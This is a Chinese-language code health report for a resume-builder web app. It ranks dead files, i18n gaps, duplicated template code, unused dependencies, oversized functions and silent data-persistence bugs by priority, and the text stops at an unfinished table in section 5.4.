# 代码体检报告

> 基线 commit `f88c7bd` · 扫描日期 2026-09-20 · **只读，未改动任何源码**
> 前置：《[feature-inventory.md](feature-inventory.md)》（功能清单）与《[feature-interactions.md](feature-interactions.md)》（交互矩阵）。
> 本报告**不重复**那两份的结论，只做引用；新增四类测量：规模与复杂度、测试覆盖、安全面、重复实现。

## 怎么读这份报告

每条给四要素：**文件位置 / 问题原因 / 影响范围 / 处理顺序**。
处理顺序用 P0–P3：

| 级别 | 含义 |
|---|---|
| **P0** | 用户可见的正确性缺陷或安全漏洞，**不改就是错的** |
| **P1** | 确定性死代码/死依赖，删除零风险，但不清会持续误导后来者 |
| **P2** | 结构性债务，改动有回归风险，需排期 |
| **P3** | 可做可不做，做了更清爽 |

---

# 一、无人使用的文件

扫描口径：解析相对路径 + `@/` 别名 + `index.ts/tsx` 兜底。脚本 `scripts/audit/orphan-scan.mjs`，**可重跑**。

## 1.1 确证的孤儿文件（3 个，零引用）

| # | 文件位置 | 问题原因 | 影响范围 | 顺序 |
|---|---|---|---|---|
| 1 | [src/app/app/dashboard/resumes/utils.ts](src/app/app/dashboard/resumes/utils.ts)（27 行） | 功能已迁走、文件没删。证据是同仓注释：[importFromAi.ts:20](src/lib/profile/importFromAi.ts#L20) 写着「文本清洗（**原在 resumes/utils.ts**，被这里与简历导入共用）」。文件内 3 个函数全部无调用方，另有 3 处 `} catch (error) { }` 空吞异常 | 零功能影响。但它是**误导读者的陷阱**：有人找「文本清洗」会先找到这里，改完发现没生效 | **P1** |
| 2 | [src/components/shared/icons/PdfIcon.tsx](src/components/shared/icons/PdfIcon.tsx)（12 行） | 全项目零引用。它导出的图标在 `PdfExport` 的菜单里**没有被用到** —— 那里用的是别的图标（见二·重复） | 零影响 | **P1** |
| 3 | [src/components/ui/alert.tsx](src/components/ui/alert.tsx) | 全项目零引用。**高危混淆项**：同目录另有 `alert-dialog.tsx`，被 5 个文件使用。二者名字只差 6 个字符 | 零功能影响。**误删 `alert-dialog.tsx` 会同时打断 5 个弹窗**（用户删除、简历删除、档案导入存档、主题弹窗、板块删除） | **P1**，且必须与 `alert-dialog.tsx` 分开标注 |

## 1.2 扫描器的两个边界（别当成孤儿）

| 文件 | 为什么被扫成孤儿 |
|---|---|
| [src/eval/report.ts](src/eval/report.ts)、[src/eval/runner.ts](src/eval/runner.ts) | 被 `scripts/eval.ts:18-19` 引用，而脚本在 `src/` 之外，扫描器不覆盖。**不是孤儿** |

## 1.3 引用不足但不算无用的

| 对象 | 位置 | 事实 | 顺序 |
|---|---|---|---|
| `DEFAULT_FONT_FAMILY` | [fonts.ts:23](src/utils/fonts.ts#L23) | 导出，但只有**同文件** [:28](src/utils/fonts.ts#L28) 用。跨文件零引用 | **P3**：去掉 `export` 即可 |
| `LanguageSwitch` | [LanguageSwitch.tsx](src/components/shared/LanguageSwitch.tsx) | 全仓唯一引用是落地页 [SiteNav.tsx:4](src/components/landing/SiteNav.tsx#L4)。**编辑器与工作台没有任何语言切换入口** | **P2**：不是死文件，是**功能缺口** —— 用户在工作台里改不了语言，只能退回落地页 |
| `.mjs` MIME 条目 | [server.mjs:22](server.mjs#L22) | 注释说明「pdfjs 的 worker 是 .mjs，缺这条 PDF 导入在部署版直接不可用」。**实测 `public/` 与 `dist/client/` 下已无任何 `.mjs` 文件**（PDF 导入功能已删） | **P3**：保留无害，但注释在描述一个已不存在的功能 |

---

# 一·补、界面文案硬编码中文（英文界面显示中文）

这一类严格说属于「i18n 缺口」而非「无人使用」，但它的用户可见度比死代码高得多，单列。

> **更正**：[feature-inventory.md](feature-inventory.md) 的 P0 #1 曾把「`workbench.layout` 整个命名空间不存在」
> 列为最重的一条。**那是我的误判** —— 我查的是 `workbench.layout`，而真实路径是
> `workbench.sidePanel.layout`，它在 zh/en 里都完整存在（含 6 个标准板块名）。
> 侧边栏「添加板块」的标题一直是好的。详见批次 1 的修复记录。

**完整清单见** [feature-inventory.md](feature-inventory.md) 的「未走 i18n 的硬编码中文」一节（40+ 处）。这里只挑**影响最具体的一组**：

## 条目标题兜底文案全部硬编码中文

| 位置 | 硬编码 | 现象 |
|---|---|---|
| [EditorHeader.tsx:104](src/components/editor/EditorHeader.tsx#L104) | `"未命名简历"` | 标题留空时**写入数据**，不只是显示 |
| [EducationItem.tsx:185](src/components/editor/education/EducationItem.tsx#L185) | `"未填写学校"` | 英文界面显示中文 |
| [ExperienceItem.tsx:156](src/components/editor/experience/ExperienceItem.tsx#L156) | `"家里蹲公司"` | 英文界面显示中文，**且措辞是玩笑口吻** |
| [ProjectItem.tsx:198](src/components/editor/project/ProjectItem.tsx#L198) | `"未命名项目"` | 英文界面显示中文 |
| [CustomItem.tsx:139](src/components/editor/custom/CustomItem.tsx#L139) | `"未命名模块"` | 英文界面显示中文 |

- **问题原因**：兜底文案直接内联中文字面量，没走 `t()`。
- **影响范围**：**同一份简历在两个页面显示不同** —— 简历列表用 `t("dashboard.resumes.untitled")`（[ResumeCardItem.tsx:127](src/app/app/dashboard/resumes/ResumeCardItem.tsx#L127)），而 `en.json` 里这个 key **已经有现成翻译** `"Untitled Resume"`。所以现象是：列表页显示 `Untitled Resume`，点进编辑器却显示 `未命名简历`。
- **额外风险**：`EditorHeader` 那处不只是显示 —— 输入框失焦时 `updateResumeTitle(e.target.value || "未命名简历")` 会把这个中文串**写进 store 并镜像到 `saves/`**。
- **顺序**：**P1**。修法很轻：5 处换成 `t()`，其中 1 处直接复用已存在的 key。

## 另两处文案/行为不一致（同一成因）

| # | 现象 | 位置 | 原因与影响 |
|---|---|---|---|
| 2 | **「至今」开关在切换语言后显示错** | [Field.tsx:71-73](src/components/editor/Field.tsx#L71) | 判定写成 `value.endsWith(" - " + t("field.toPresent"))` —— **按当前界面语言的文案判定**。中文界面存成 `2021.07 - 至今` 的简历，切到英文界面后 `t()` 变成 `"To Present"`，开关显示为**关**。同仓另有 `PRESENT_RE`（[dayjsValue.ts:15](src/lib/dayjsValue.ts#L15)）与 `PRESENT_SUFFIX`（[entityUtils.ts:36](src/lib/profile/entityUtils.ts#L36)）两个正则版本，其中 `dayjsValue.ts:14` 的注释声称「与 `entityUtils` 一致」——**注释是错的**，两者一个锚定结尾、一个不锚定。三处判定，三种行为 |
| 3 | **中英文界面的板块名不一致** | [F6/F7] | `SECTION_DEFS.titleKey` 指向 `profile.sections.*`，`STANDARD_MODULES.titleKey` 指向 `workbench.layout.standardSections.*`。实测 en：`profile.sections.experience` = `"Work Experience"`，而 `layout.standardSections.experience` = `"Experience"` —— **同一批板块在向导里和侧边栏里名字不同**。（注：`workbench.layout` 整个命名空间在字典里不存在，见 [feature-inventory.md](feature-inventory.md) P0 #1，所以侧边栏那套现在显示的是原始 key） |

---

# 二、重复出现的功能

## 2.1 同一份 id → i18n key 映射写了两遍

| 位置 | 内容 |
|---|---|
| [TemplateGallery.tsx:21-22](src/app/app/dashboard/resumes/TemplateGallery.tsx#L21) | `toTemplateNameKey`：`left-right` → `leftRight` |
| [templates/page.tsx:31-32](src/app/app/dashboard/templates/page.tsx#L31) | `getTemplateKey`：同上，**逐字相同的逻辑，函数名不同** |

- **问题原因**：两处各自实现了一次「模板 id 转 i18n key」。
- **影响范围**：将来新增一个 id 带连字符的模板（比如 `two-column`），**必须记得改两处**。漏一处的现象是：模板页显示中文名，简历列表页显示成一串英文（因为 `leftRight` 拼不出来时 i18n 静默返回 key）。
- **顺序**：**P1**（合并成本极低，两行改成一处导入）

## 2.2 「PDF 长页」与「PDF」共用同一个图标

| 位置 | 内容 |
|---|---|
| [PdfExport.tsx:258](src/components/shared/PdfExport.tsx#L258) | 「PDF(长页)」卡片复用 `PdfGlassIcon` |

- **问题原因**：导出菜单里 5 张卡片，两张用了完全相同的图标。
- **影响范围**：用户在菜单里看到两个一模一样的图标，只能靠文字区分。**这是可用性缺陷，不是死代码**。
- **顺序**：**P3**

## 2.3 「条目可见性切换」的防抖逻辑实现了 4 遍

| 位置 | 行数 | 额外差异 |
|---|---|---|
| [education/EducationItem.tsx:104-122](src/components/editor/education/EducationItem.tsx#L104) | 19 行 | 依赖数组 `[education, updateEducation, isUpdating]` |
| [experience/ExperienceItem.tsx:78-96](src/components/editor/experience/ExperienceItem.tsx#L78) | 19 行 | 依赖 `[experience, updateExperience, isUpdating]` |
| [project/ProjectItem.tsx:110-128](src/components/editor/project/ProjectItem.tsx#L110) | 19 行 | 依赖 `[project, updateProjects, isUpdating]` |
| [custom/CustomItem.tsx:75-88](src/components/editor/custom/CustomItem.tsx#L75) | 14 行 | 依赖多一个 `sectionId`，回调签名也不同 |

四份实现都是同一个模式：`isUpdating` state + 10ms `setTimeout` 守卫 + `disabled={isUpdating}`。

- **问题原因**：`useEnsureSectionEnabled` / `useAddSectionEntities` 已经抽进了 [components/editor/shared/](src/components/editor/shared/)，**唯独这个防抖没抽**。
- **影响范围**：改防抖时长（比如 10ms 改 50ms）要改四处。四处已经**轻微漂移**（CustomItem 少 5 行、回调签名不同）—— 这是典型的「复制后各自演化」。
- **顺带说明一个反例**：删除确认弹窗**做对了** —— `ThemeModal` 被 5 个条目组件共用（[ExperienceItem:13](src/components/editor/experience/ExperienceItem.tsx#L13)、[EducationItem:14](src/components/editor/education/EducationItem.tsx#L14)、[CertificateItem:7](src/components/editor/certificates/CertificateItem.tsx#L7)、[CustomItem:15](src/components/editor/custom/CustomItem.tsx#L15)、[ProjectItem:13](src/components/editor/project/ProjectItem.tsx#L13)），没有各写一遍。所以这个项目的复用习惯是**有的**，只是不系统。
- **顺序**：**P2**（抽一个 `useVisibilityToggle` 即可，风险低但要动 4 个文件）

## 2.4 4 套模板的 section 组件是复制体（**已漂移，且漏了一处功能**）

对 [templates/{classic,modern,left-right,timeline}/sections/](src/components/templates/) 做 md5 比对：

| 组件 | 情况 |
|---|---|
| `SelfEvaluationSection.tsx`、`SkillSection.tsx` | **4 份 md5 完全相同**（各 27 行） |
| `BaseInfo.tsx` | classic / left-right / timeline **3 份完全相同**（112 行）；modern 是改色版 |
| `CustomSection` / `EducationSection` / `ExperienceSection` / `ProjectSection` | 3 份相同；modern 各是改色或 `variant` 版 |
| `SectionTitle.tsx` | 4 份互不相同，但标题解析逻辑逐字相同 |

**已经漂移的证据（实测）**：

| # | 现象 | 验证 |
|---|---|---|
| 1 | **GitHub 贡献图在「两栏布局」(modern) 上永不渲染** | `grep -c GithubContribution`：classic **2**、left-right **2**、timeline **2**、**modern 0**。modern 是复制 classic 后改色时漏掉的那一段 |
| 2 | timeline 的 `headerSize` 兜底是 **20**，其余三套是 **18** | [timeline/sections/SectionTitle.tsx:31](src/components/templates/timeline/sections/SectionTitle.tsx#L31)，而全局默认 `headerSize` = 18 |
| 3 | 证件照兜底尺寸 **100**，权威默认是 **90** | 模板 `basic.photoConfig?.width \|\| 100`；[types/resume.ts:12](src/types/resume.ts#L12) `DEFAULT_PHOTO_CONFIG.width = 90`。`photoConfig` 缺失时渲染 100×100（**正方形**），而 `PhotoCropper` 固定 3:4 —— 兜底路径会二次裁切 |
| 4 | modern 的 `BaseInfo` 兜底对象少 `label` 字段 | classic `{key,label,visible}` vs modern `{key,visible}` —— 类型上是 `any`，靠运行时运气 |

- **问题原因**：4 套模板的视觉差异**只在 wrapper 的 className/style**，但整个组件被整份复制。项目里已有正确先例（[templates/shared/SectionWrapper.tsx](src/components/templates/shared/SectionWrapper.tsx)、[CertificatesSection.tsx](src/components/templates/shared/CertificatesSection.tsx) 就是抽出来的共享件）。
- **影响范围**：**任何 section 的渲染 bug 要修 4 遍，且已经漏了一处（modern 的 GitHub 图）**。
- **顺序**：**P1**（先修 #1 那个功能缺失，成本极低）；**P2**（合并：从 4 份全同的 `SelfEvaluationSection` / `SkillSection` 开刀，零视觉风险）

## 2.5 板块元数据在两个 config 里各存一份

| 位置 | 常量 | 用途 |
|---|---|---|
| [config/modules.ts:8-13](src/config/modules.ts#L8) | `STANDARD_MODULES`（6 项） | 简历编辑器侧边栏「添加板块」的候选清单 |
| [config/sections.ts:41-50](src/config/sections.ts#L41) | `SECTION_DEFS`（8 项） | 职业数据库的板块定义（谁收哪种条目、是否必填） |

**两者不是简单的重复 —— 是刻意的两层**，[sections.ts:36-39](src/config/sections.ts#L36) 的注释明确说明：「简历层自己的证书模块（`STANDARD_MODULES`）是另一回事，操作单份简历，不受影响」。集合确实不同：

| id | `STANDARD_MODULES` | `SECTION_DEFS` | 备注 |
|---|---|---|---|
| skills / experience / projects / education / selfEvaluation | ✅ | ✅ | **重叠的 5 项** |
| certificates | ✅ | ❌ | 只在简历层 |
| basic / campus / honors | ❌ | ✅ | 只在数据库层 |

- **问题原因**：重叠的 5 项，**id 与 icon 在两个文件里各存了一份**。
- **影响范围**：把「专业技能」的图标从 ⚡ 改成别的，**必须改两处**。漏一处的现象是：侧边栏添加板块的弹出层显示旧图标，而数据库导航显示新图标 —— 同一功能两个图标。`titleKey` 倒是分属不同命名空间（`workbench.*` vs `sections.*`），不算重复。
- **顺序**：**P3** —— 集合差异是有意的，**不要合并这两个常量**；可行的只是把重叠 5 项的 icon 抽到一个共享表。收益小，风险也小，可以不做。

---

# 三、无用的依赖与接口

## 3.1 依赖

| # | 依赖 | 位置 | 事实（实测） | 影响范围 | 顺序 |
|---|---|---|---|---|---|
| 1 | `@heroui/react` + `@heroui/theme` | [package.json:24-25](package.json#L24) | **整个依赖只为 [providers.tsx:9](src/app/providers.tsx#L9) 的一个 `<HeroUIProvider locale={locale}>` 包裹**。全项目没用它任何组件。但 [tailwind.config.ts:182](tailwind.config.ts#L182) 把 `heroui()` 注册为 Tailwind 插件、[:8](tailwind.config.ts#L8) 把 `node_modules/@heroui/theme/dist` 扫进 content | 移除需**同时**改 3 处：`providers.tsx`、`tailwind.config.ts` 两行、`package.json`。漏改 tailwind 会**静默产出错误的 CSS**（插件不生效但构建不报错） | **P2** |
| 2 | `pdfjs-dist`（37MB） | [package.json:91](package.json#L91) | 唯一使用点是 [scripts/e2e/core-flow.mjs:143](scripts/e2e/core-flow.mjs#L143)，用来校验 PDF 文字层。**不在客户端产物里**（实测产物 chunk 无 pdfjs） | 只占开发环境磁盘。**别删** —— 它是验证 §B2 文字层缺陷的唯一手段 | **P3**：标注用途即可 |
| 3 | `lodash`（4.9MB） | [package.json](package.json) | 只用了两个函数：`lodash/throttle`（[preview/index.tsx:3](src/components/preview/index.tsx#L3)）、`lodash/debounce`（[SidePanel.tsx:4](src/components/editor/SidePanel.tsx#L4)） | 按需引入，产物影响小；但**多一个依赖就多一条供应链与升级路径** | **P3** |
| 4 | `antd`（59MB，实测为依赖树里最大） | [package.json](package.json) | 只用于日期选择器，落在 3 个文件：[BirthdayPicker.tsx:1](src/app/app/dashboard/profile/BirthdayPicker.tsx#L1)、[unified-date-input.tsx:1](src/components/ui/unified-date-input.tsx#L1)、[unified-date-range-input.tsx:2](src/components/ui/unified-date-range-input.tsx#L2)。**与 HeroUI 并存 = 两套 UI 框架** | 实测产物里 antd 被隔离进 `unified-date-range-input-*.js`（1.3MB），**没有污染主包**。所以体积可控，真正的问题是**两套设计语言**：`providers.tsx` 要专门写一个 `AntdProvider` 把 antd 的主题 token 手工对齐到 Tailwind | **P2** |

## 3.2 接口

| 对象 | 位置 | 事实 | 顺序 |
|---|---|---|---|
| `/api/match` 与 `/api/tag` | [match.ts](src/routes/api/match.ts) / [tag.ts](src/routes/api/tag.ts) | 两个路由文件各 **5 行**，共用 [llmRoute.ts](src/lib/server/llmRoute.ts) 的同一个处理器。**不是重复实现** —— 这是正确的抽象 | 无需处理 |
| `/api/saves` 的 3 个方法 | [saves.ts](src/routes/api/saves.ts) | GET/POST/DELETE 职责清晰，无冗余。**默认关闭**（`SAVES_ENABLED !== "1"` 时 404） | 无需处理 |
| 前端无「测试连接」接口 | 全仓 | 没有 `/api/verify-key` 之类的校验端点。**这是接口缺口不是冗余** —— key 有效性只能在真实调用时以错误暴露 | **P3** |

---

# 四、复杂度与调用链路

## 4.1 文件规模（实测）

对照用户代码规范的硬指标：**200–400 行为宜，超 400 拆分，超 800 禁止**。

| 阈值 | 数量 | 文件 |
|---|---|---|
| **> 800 行（禁止）** | **1** | [useResumeStore.ts](src/store/useResumeStore.ts) **932 行** |
| > 400 行（应拆） | 13 | 下表列出会进产物的 8 个 |

**进入构建产物的超限文件**（排除 `routeTree.gen.ts` 自动生成、`eval/**` 开发期工具）：

| 行数 | 文件 | 问题原因 | 影响范围 | 顺序 |
|---|---|---|---|---|
| 932 | [store/useResumeStore.ts](src/store/useResumeStore.ts) | 一个 store 装了 35 个 action + 历史栈 + 用户分区 + 持久化迁移。单函数 `useResumeStore()` 就 **752 行** | 改任何一处简历行为都要在这 932 行里定位。**它是全项目的状态中枢**，被 9 个文件直接引用，拆分风险最高但收益也最大 | **P2** |
| 764 | [components/editor/SidePanel.tsx](src/components/editor/SidePanel.tsx) | 单函数 692 行，内含 7 组设置项（主题色/字体/行高/4 种字号/3 组间距），每组都是「Slider + Input + ±按钮」的近似结构 | 7 组结构高度相似却没抽组件 —— 这是 §二「重复功能」最集中的地方。改一处间距逻辑要同步改 3 遍 | **P2** |
| 724 | [components/ui/sidebar.tsx](src/components/ui/sidebar.tsx) | shadcn 生成的标准组件，**不是自写代码** | 不要动。shadcn 的约定就是整块复制进项目 | **不动** |
| 708 | [rich-editor/RichEditor.tsx](src/components/shared/rich-editor/RichEditor.tsx) | 单函数 277 行，含桌面/移动两套工具栏（重复渲染同一批按钮） | 移动端工具栏(:683-695)与桌面端(:563-651)是两套并列 JSX，加一个按钮要加两处 | **P2** |
| 609 | [components/editor/IconSelector.tsx](src/components/editor/IconSelector.tsx) | 图标清单内联在组件里 | 纯数据文件，拆分收益低 | **P3** |
| 530 | [basic/BasicPanel.tsx](src/components/editor/basic/BasicPanel.tsx) | 单函数 372 行，同时管基础字段与自定义字段**两套**增删排序显隐 | 两套逻辑结构相似但独立，是重复实现的温床 | **P2** |
| 506 | [utils/export.ts](src/utils/export.ts) | 装了 6 种导出格式（打印/长页PDF/长图/JSON/Markdown + 工具函数） | 每种导出独立，内聚度尚可。**但它是 `githubKey` 泄漏点（§6.2）** | **P2** |
| 402 | [templates/page.tsx](src/app/app/dashboard/templates/page.tsx) | 单页含模板陈列 + 预览弹窗 + 颜色轮播 + 直接建简历 | 功能确实多，拆分收益中等 | **P3** |

## 4.2 函数规模（实测）

**70 个函数超 80 行**。Top 10：

| 行数 | 位置 | 函数 |
|---|---|---|
| **752** | [useResumeStore.ts:166](src/store/useResumeStore.ts#L166) | `useResumeStore()` |
| **692** | [SidePanel.tsx:73](src/components/editor/SidePanel.tsx#L73) | `SidePanel()` |
| 372 | [BasicPanel.tsx:157](src/components/editor/basic/BasicPanel.tsx#L157) | `BasicPanel()` |
| 331 | [PhotoConfigDrawer.tsx:39](src/components/shared/PhotoConfigDrawer.tsx#L39) | `PhotoConfigDrawer()` |
| 316 | [eval/report.ts:47](src/eval/report.ts#L47) | `buildReport()`（开发期工具，不影响运行时） |
| 311 | [ResumeWorkbench.tsx:28](src/app/app/dashboard/resumes/ResumeWorkbench.tsx#L28) | `ResumeWorkbenchInner()` |
| 295 | [CreateResumeWizard.tsx:57](src/app/app/dashboard/resumes/CreateResumeWizard.tsx#L57) | `CreateResumeWizard()` |
| 277 | [RichEditor.tsx:430](src/components/shared/rich-editor/RichEditor.tsx#L430) | `RichTextEditor()` |
| 275 | [PreviewDock.tsx:66](src/components/preview/PreviewDock.tsx#L66) | `PreviewDock()` |
| 254 | [TargetsWorkbench.tsx:33](src/app/app/dashboard/targets/TargetsWorkbench.tsx#L33) | `TargetsWorkbenchInner()` |

**注意 `useResumeStore` 那一行**：752 行的单个函数意味着它**没有可测试的接缝** —— 这是它唯一的测试文件（[useResumeStore.test.ts](src/store/useResumeStore.test.ts)）只能整体测 store 行为、无法针对单个 action 隔离测试的结构性原因。

## 4.3 嵌套深度（实测，含 JSX 噪声）

深度 >10 的文件只有 2 个，且**都在死代码或装饰组件里**：

| 深度 | 位置 | 说明 |
|---|---|---|
| 11 | [client.tsx:165](src/app/app/dashboard/client.tsx#L165) | **在侧边栏子菜单渲染块内 —— 那是死代码**（`sidebarItems` 无一项带 `items`，见 [feature-inventory.md](feature-inventory.md) P1 #25）。删掉即消失 |
| 10 | [GithubContribution.tsx:158](src/components/shared/GithubContribution.tsx#L158) | 贡献日历的三层循环（周 → 日 → 格） |

**结论：嵌套深度不是本项目的问题。** 用户规范里「嵌套不深于 4 层」这条，在 JSX 语境下应按「逻辑嵌套」而非「括号层级」理解 —— 实测逻辑嵌套最大 11，且仅 2 处超 10。这一项**不需要排期处理**。

## 4.4 调用链路

**结构性事实**（已核）：

- **存档镜像是最难追的一条链**：[useSavesMirror.ts](src/hooks/useSavesMirror.ts) 是**订阅式**触发 —— 没有显式调用点，靠 `useCareerProfileStore.subscribe` / `useResumeStore.subscribe` / `useJobTargetStore.subscribe` 三处订阅 + 1500ms 防抖 + 失败重试队列。`/api/saves` 的调用方**全项目只有这一个文件**。
- 该 hook 挂在**两个地方**（[dashboard/client.tsx:39](src/app/app/dashboard/client.tsx#L39) 与 [workbench/[id]/page.tsx:167](src/app/app/workbench/[id]/page.tsx#L167)），因为编辑器不在 dashboard 布局内。靠 `start()` 的幂等守卫防重复订阅 —— **如果那个守卫被误删，会出现双份写盘**。

### 链 1：匹配分析（8 层，跨 6 个模块）

```
[UI] TargetsWorkbench.tsx:212  点击「智能分析」
  └→ :94  handleAnalyze()          —— 先校验 aiReady，无 key 直接 setError 返回
      └→ lib/match/analyzeMatch.ts:127  analyzeMatch()
          ├→ :128 buildEntityFingerprints()      [纯函数·有测试]
          ├→ :129 checkCache()                   [纯函数·有测试] —— 命中则(:136)直接 return，不发请求
          ├→ :145 buildMatchPrompt()             [纯函数·有测试]
          ├→ :62  requestAnalysis()
          │     └→ :71 fetch("/api/match")       ★ 第 1 次跨界（浏览器 → 服务端）
          │         └→ lib/server/llmRoute.ts:35 handleLlmRoute()
          │             ├→ :36 guardRequest()    [限流]
          │             └→ :54 callLLM()
          │                 └→ :74 fetch(DeepSeek)  ★ 第 2 次跨界（本服务 → 上游）
          ├→ validateMatchResult.ts:432  由名次推导 level（v4 起模型只排序）
          └→ :120-133 写 useJobTargetStore.setAnalysis()
              └→ hooks/useSavesMirror.ts:146 subscribe 触发  ★ 第 3 次跨界（内存 → 磁盘）
                  └→ :83 1500ms 防抖 → :86 flush → :64 fetch("/api/saves")
```

- **分层**：6 个模块（UI / match / server / eslint 路由 / store / hook）。**3 次跨界**（浏览器→服务端→上游→回写浏览器→磁盘再→服务端）。
- **隐式环节**：末尾那次磁盘镜像**不在任何 onClick 里** —— 它由 `subscribe` 触发。这也是为什么 UI 上永远看不到「保存中」。
- **断点**：`requestAnalysis` 只重试一次（[:96-104](src/lib/match/analyzeMatch.ts#L96)，间隔 1200ms）。**重试两次都失败后，用户看到的是上游错误原文**（如 DeepSeek 的英文报错），中间经过 400/502 映射，信息有损但可接受。**这一层没问题** —— `error` 会渲染在 [TargetsWorkbench.tsx:259](src/app/app/dashboard/targets/TargetsWorkbench.tsx#L259) 的错误块里。

### 链 2：简历生成（4 层，最短的一条）

```
[UI] CreateResumeWizard.tsx:330 点击「开始生成」
  └→ ResumeWorkbench.tsx:96 handleWizardComplete()
      ├→ :113 标题撞名检测
      └→ lib/profile/generateResume.ts   [有测试] —— 纯函数：档案 + 勾选 → ResumeData
          └→ :167 addResume() → router.push 工作台
              └→ useSavesMirror 镜像
```

- **分层**：4 个模块。**这条链是健康的** —— 核心转换 `generateResume` 是纯函数且有测试（[generateResume.test.ts](src/lib/profile/generateResume.test.ts)），物化过程 `materialize.ts` 也有测试。
- **可作对照**：它证明了**这个项目的纯函数抽取是有效的**。链 1 的问题是编排层（`analyzeMatch`）没测，链 3 的问题是隐式触发。

### 链 3：存档镜像（**唯一的隐性链，且失败静默**）

```
任意 store 的一次 set()          ← 没有显式调用点
  └→ useSavesMirror.ts:146/152/156  subscribe 回调
      └→ :126 sync()   —— diff 快照，产出增量 op
          └→ :138 schedule() → :83 setTimeout(1500ms)
              └→ :86 flush()
                  └→ :64 send() → fetch("/api/saves", POST|DELETE)
                      └→ routes/api/saves.ts → lib/server/saves.ts:118 writeSaveFile()
```

- **分层**：5 个模块，**零个显式调用点** —— 追这条链只能从 `useSavesMirror` 反向找订阅者。
- **断点（已证实，P1）**：[useSavesMirror.ts:106-117](src/hooks/useSavesMirror.ts#L106) —— 连续失败 **3 次**后 `gaveUp = true`，**只 `console.warn` 一句，界面上没有任何提示**：

  ```js
  console.warn("[saves] 同步到 saves/ 连续失败，已停止尝试。浏览器里的数据不受影响。");
  ```

- **影响范围**：
  - **静态部署**（`/api/saves` 不存在）：这是**正确的设计** —— 端点本就不存在，没必要一直打、也不该弹 toast 骚扰用户。
  - **开了 `SAVES_ENABLED=1` 的部署**：磁盘满 / 权限错 / 目录被删 → 用户以为数据存到磁盘了，**实际磁盘上是旧内容，而他不会知道**。`saves/` 恰恰是「用户以为的数据备份」。
- **顺序**：**P1**。修法轻：`gaveUp` 时用一个持久化的界面提示（比如 SaveBar 变红），而不是只写控制台。**注意不要改成每次失败都弹 toast** —— 静态部署下那会是灾难。

# 五、数据正确性与持久化缺陷（6 条）

> 前四条是追「链 3：存档镜像」时挖出来的，后两条是比对「同一逻辑的多份实现」时挖出来的。
> 六条的共同点是**用户的数据或视图与实际不符，且不会报错** —— 比复杂度更值得先看。
> 彼此独立，可分别修。

## 5.1 【P1】`journal.ts` 写了、测了、但**从未接线**

| 位置 | 事实 |
|---|---|
| [lib/saves/journal.ts](src/lib/saves/journal.ts) | 完整的「未落盘改动日志」实现，**有 190 行 + 完整单测**（[journal.test.ts](src/lib/saves/journal.test.ts)） |
| 全仓引用 | `grep -rn journal src scripts` **只命中两处**：`journal.ts` 自己、`journal.test.ts`。**没有任何 app 代码 import 它** |
| [routes/api/saves.ts:85](src/routes/api/saves.ts#L85) | 注释仍写着「客户端会把没写成功的改动留在 journal 里重试」—— **这句话描述的实现不存在** |

- **问题原因**：`journal.ts` 的文件头注释自己说明了它要解决什么：
  > 「真相源是磁盘，所以『改了但还没写成功』这段窗口不能只存在内存里 —— 关标签页、崩、掉电都会把它抹掉。」
  > 「**未刷成功的 delete 会永久丢失**（下次启动的基线来自磁盘，磁盘上那个文件还在，diff 便再也推不出 delete）」

  而 [useSavesMirror.ts](src/hooks/useSavesMirror.ts) 的失败重试队列（`pending`）是**模块级 `Map`，纯内存**（[:47](src/hooks/useSavesMirror.ts#L47)）。
- **影响范围**：**这正是那个模块想堵的洞，洞还开着。** 实测后果：
  1. 用户删掉一份简历 → 1500ms 防抖窗口内关掉标签页 → 磁盘上那个 `.json` **永远留着**，下次启动 diff 推不出 delete。
  2. 断网期间的所有改动，刷新后丢失重试队列。
- **严重性说明**：这不是「没写完的功能」，是**已完成但没接线的功能** —— 有实现、有测试、有文档，只差在 `useSavesMirror` 里调一下。三份文件的注释各自描述了三种不同架构（`api/saves.ts` 说有 journal、`mirror.ts` 说 localStorage 是真相源、`journal.ts` 说磁盘是真相源），说明**架构在演进中改了主意，注释没跟上，接线也漏了**。
- **顺序**：**P1**（要么接线，要么把 `journal.ts` 和三处矛盾注释一起删掉。**保持现状最糟** —— 它会让下一个读者以为这个洞已经堵上了）

## 5.2 【P1】两个 store 对「无当前用户」的处理相反

| Store | 位置 | `!userId` 时的行为 |
|---|---|---|
| `useResumeStore` | [useResumeStore.ts:186-189](src/store/useResumeStore.ts#L186) | `if (!touchesResumes \|\| !userId) { rawSet(...); return; }` —— **照常写入**（只更新 `resumes` 别名，不更新 `byUser`） |
| `useJobTargetStore` | [useJobTargetStore.ts:100](src/store/useJobTargetStore.ts#L100) | `if (!userId) return;` —— **整次写入静默丢弃** |

- **问题原因**：同一件事（没有当前用户时该不该落数据）在两个 store 里是**相反**的决定，且都没有注释说明理由。
- **影响范围**：
  - 简历侧：能看到新简历、能编辑，但**既不进 `byUser`、也不镜像磁盘** —— 刷新即消失，且用户全程没有提示。
  - 岗位侧：AI 分析跑了十几秒，结果**凭空消失**，界面只看到 loading 结束后没变化。
- **顺序**：**P2**（要统一成哪一种，是产品决定；但**必须选一种并注释理由**）

## 5.3 【P2】传递依赖环（store → config → 模板 → store）

```
store/useResumeStore.ts:15   import { DEFAULT_TEMPLATES } from "@/config"
  └→ config/index.ts:3       export { DEFAULT_TEMPLATES } from "@/components/templates/registry"
      └→ templates/registry.ts    import ClassicTemplate from "./classic" …（静态拉起 4 套模板）
          └→ classic/index.tsx → sections/ProjectSection.tsx
              └→ shared/SectionWrapper.tsx:2   import { useResumeStore } from "@/store/useResumeStore"
                  └→ 回到 store/useResumeStore.ts   ← 环
```

- **问题原因**：[config/index.ts:3](src/config/index.ts#L3) 一行 re-export，把**整个模板组件树**拉进了 `config`（本应是最底层）。
- **为什么现在不炸**：环的闭合点 [SectionWrapper.tsx:22](src/components/templates/shared/SectionWrapper.tsx#L22) 在**组件体内**调 store，不在模块初始化期。**但任何人在模板文件里写一行模块级的 `useResumeStore.getState()` 就会 TDZ 崩溃**，且报错会指向模板文件，看不出是环的问题。
- **影响范围**：`import { useResumeStore }`（35 个文件）会连带静态拉起 4 套模板 + 全部 section 组件 + framer-motion。`generateResume.ts` 作为纯逻辑也被拖进 UI 层。
- **实测的闭合点唯一性**：`grep -rn 'from "@/store' src/components/templates/` **只命中 `SectionWrapper.tsx` 一条** —— 也就是说这个环的闭合是**偶然的**，不是有意设计。
- **顺序**：**P2**（改成直接 import `@/components/templates/registry`、让 `config/index.ts` 不再 re-export 组件，即可断环）

## 5.4 【P1】「库是否为空」有两份判定，导入用的那份漏 4 个维度

| 版本 | 位置 | 判定范围 |
|---|---|---|
